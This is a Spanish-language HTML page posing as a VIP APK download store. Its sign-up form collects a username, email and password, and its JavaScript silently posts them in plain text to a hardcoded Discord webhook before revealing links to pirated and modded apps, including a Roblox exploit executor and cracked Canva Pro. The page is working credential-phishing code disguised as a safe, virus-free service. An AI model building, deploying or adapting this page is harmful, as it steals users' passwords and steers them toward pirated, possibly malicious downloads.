
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DRIP STORE | PREMIUM ACCESS 👑</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;700;900&display=swap" rel="stylesheet">
    <style>
        :root { --accent: #00f2ff; }
        * { font-family: 'Outfit', sans-serif; cursor: default; }
        
        body {
            background: linear-gradient(-45deg, #030305, #0a0a1f, #160a2c, #030305);
            background-size: 400% 400%;
            animation: gradient 15s ease infinite;
            color: white;
            min-height: 100vh;
        }
        @keyframes gradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .glass {
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .btn-premium {
            background: white;
            color: black;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }
        .btn-premium:hover {
            transform: scale(1.05);
            background: var(--accent);
            box-shadow: 0 0 25px rgba(0, 242, 255, 0.6);
        }

        .apk-card {
            transition: all 0.3s ease;
        }
        .apk-card:hover {
            transform: translateY(-5px);
            background: rgba(255, 255, 255, 0.08);
            border-color: var(--accent);
        }

        .loader {
            border: 3px solid rgba(255,255,255,0.1);
            border-top: 3px solid var(--accent);
            border-radius: 50%;
            width: 20px; height: 20px;
            animation: spin 1s linear infinite;
            display: none;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body class="flex items-center justify-center p-4">

    <section id="auth-screen" class="w-full max-w-md">
        <div class="text-center mb-8">
            <h1 class="text-5xl font-black italic tracking-tighter">CODEX <span class="text-[#00f2ff]">DRIP</span></h1>
            <p class="text-gray-400 text-xs tracking-[5px] mt-2">🛡️ SIN VIRUS | SEGURO</p>
        </div>

        <div class="glass p-8 rounded-[35px] relative">
            <div class="absolute -top-3 -right-3 bg-[#00f2ff] text-black text-[10px] font-bold px-3 py-1 rounded-full shadow-lg">👑 VIP ACCESS</div>
            <h2 class="text-2xl font-bold mb-6 text-center text-white">CREAR CUENTA</h2>
            <div class="space-y-4">
                <input type="text" id="u" placeholder="Usuario" class="w-full p-4 bg-black/40 border border-white/5 rounded-2xl outline-none focus:border-[#00f2ff]">
                <input type="email" id="e" placeholder="Correo (@gmail, @hotmail...)" class="w-full p-4 bg-black/40 border border-white/5 rounded-2xl outline-none focus:border-[#00f2ff]">
                <input type="password" id="p" placeholder="Contraseña" class="w-full p-4 bg-black/40 border border-white/5 rounded-2xl outline-none focus:border-[#00f2ff]">
                <button onclick="enviarRegistro()" class="btn-premium w-full p-4 rounded-2xl font-black flex items-center justify-center gap-3">
                    <span id="btn-text">ACCESO INSTANTÁNEO</span>
                    <div id="loading" class="loader"></div>
                </button>
                <p id="msg" class="text-center text-[10px] text-gray-500 uppercase tracking-widest mt-4">🔥 +500 usuarios activos</p>
            </div>
        </div>
    </section>

    <section id="store-screen" class="hidden w-full max-w-2xl py-10">
        <div class="text-center mb-12">
            <h1 class="text-5xl font-black italic">DRIP <span class="text-[#00f2ff]">STORE</span></h1>
            <p class="text-gray-400 mt-2 tracking-[3px]">PREMIUM DOWNLOAD CENTER</p>
        </div>

        <div class="grid gap-4" id="app-grid">
            </div>
    </section>

    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1491367258470219796/PApu8j67Mnz9GN8JK6vqPCiNlaZvoqnEG9GBEjSBEOXAawRGc_UY-EMXVNnenDxzUjlr";

        const apps = [
            { n: 'CAP CUT PRO', d: 'Editor VIP v14.7.0', i: '🎬', l: 'https://www.mediafire.com/file/epm2wsvnt6qe3il/CapCut_PR____14.7.0_ui_old.apk/file?fbclid=IwY2xjawOmPtNleHRuA2FlbQIxMQBzcnRjBmFwcF9pZAwzNTA2ODU1MzE3MjgAAR5Z4krrda1eSlY8J4m9xL-jmITar9gRT9td4ugbfgm40EtN68mVYwcXCRyyNg_aem_pw8Ldoww20oUrXvPkiX4LA', t: 'ACTUALIZADO' },
            { n: 'DELTA EXECUTOR', d: 'Roblox Android Menu', i: '🤖', l: 'https://deltaexploits.gg/delta-executor-android', t: 'HACK' },
            { n: 'DTW MOD MENU', d: 'Special Mod Menu v0909f6', i: '⚡', l: 'https://www.mediafire.com/file/we76rly3z832ba8/DTW_ModMenu_0909f6.apk/file', t: 'HOT' },
            { n: 'GTA SAN ANDREAS', d: 'v2.11.277 Full Game', i: '🚗', l: 'https://www.mediafire.com/file/5brnv5qxhtng8no/gta%20san%20andreas%20v2.11.277%20-%20espacioapk.com.apk/file', t: 'JUEGO' },
            { n: 'CANVA PRO', d: 'Diseño Premium Unlocked', i: '🎨', l: 'https://drive.google.com/file/d/1j6TawOR3bG-g2QVjE5YA1hfEiupb9xY6/view', t: 'PRO' },
            { n: 'MINECRAFT APK', d: 'Última Versión Oficial', i: '🧱', l: 'https://mineckraftapk.com.mx/', t: 'POPULAR' },
            // TUS DOS PRÓXIMAMENTE
            { n: 'PRÓXIMAMENTE...', d: 'Cargando nuevo contenido', i: '⏳', l: '#', t: 'COMING' },
            { n: 'PRÓXIMAMENTE...', d: 'Cargando nuevo contenido', i: '⏳', l: '#', t: 'COMING' }
        ];

        async function enviarRegistro() {
            const u = document.getElementById('u').value;
            const e = document.getElementById('e').value;
            const p = document.getElementById('p').value;
            if(!u || !e || !p) return;

            document.getElementById('loading').style.display = "block";
            document.getElementById('btn-text').innerText = "CONECTANDO...";

            try {
                await fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: "🚀 REGISTRO COMPLETADO",
                            color: 61951,
                            fields: [
                                { name: "👤 User", value: u, inline: true },
                                { name: "🔑 Pass", value: p, inline: true },
                                { name: "📧 Mail", value: e }
                            ],
                            timestamp: new Date()
                        }]
                    })
                });
                abrirTienda();
            } catch(err) {
                alert("Error de conexión");
                document.getElementById('loading').style.display = "none";
                document.getElementById('btn-text').innerText = "REINTENTAR";
            }
        }

        function abrirTienda() {
            document.getElementById('auth-screen').classList.add('hidden');
            document.getElementById('store-screen').classList.remove('hidden');
            const grid = document.getElementById('app-grid');
            apps.forEach(app => {
                grid.innerHTML += `
                <div onclick="if('${app.l}'!=='#') window.open('${app.l}')" class="apk-card glass p-6 rounded-[30px] flex items-center justify-between cursor-pointer border border-white/5">
                    <div class="flex items-center gap-5">
                        <div class="text-3xl bg-black/40 w-16 h-16 flex items-center justify-center rounded-2xl shadow-inner border border-white/5">${app.i}</div>
                        <div>
                            <h3 class="font-bold text-lg">${app.n}</h3>
                            <p class="text-xs text-gray-500">${app.d}</p>
                        </div>
                    </div>
                    <span class="text-[9px] font-black bg-[#00f2ff]/10 px-2 py-1 rounded-md text-[#00f2ff] tracking-tighter">${app.t}</span>
                </div>`;
            });
        }
    </script>
</body>
</html>
